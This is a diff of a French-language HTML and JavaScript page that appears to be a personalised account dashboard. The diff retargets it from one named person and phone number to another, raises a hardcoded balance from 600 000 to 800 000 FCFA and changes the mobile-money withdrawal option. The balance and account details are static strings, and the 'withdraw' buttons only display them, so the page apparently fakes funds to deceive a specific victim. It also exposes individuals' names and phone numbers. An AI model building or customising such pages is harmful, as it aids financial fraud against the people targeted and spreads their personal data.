@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "065206674") {
+        if (code === "97886001") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde:  600 000 FCFA</span>
+                <span class="balance">Solde:  800 000 FCFA</span>
                 <div class="account-info">
-                    <span id="user-name">Amadou Diallo</span><br>
-                    <span id="user-phone">242 065 20 66 74</span>
+                    <span id="user-name">Moukaila</span><br>
+                    <span id="user-phone">228 97 88 60 01</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Mobile Money</button>
+                <button id="orange-money">Retirer via Moov Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Amadou Diallo";
-                const accountNumber = "242 065 20 66 74";
-                const balance = "600 000 FCFA";
+                const accountName = "Moukaila";
+                const accountNumber = "228 97 88 60 01";
+                const balance = "800 000 FCFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Mobile Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Moov Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Momo");
+                    setWithdrawalInfo("Moov");
                 }
             });
 
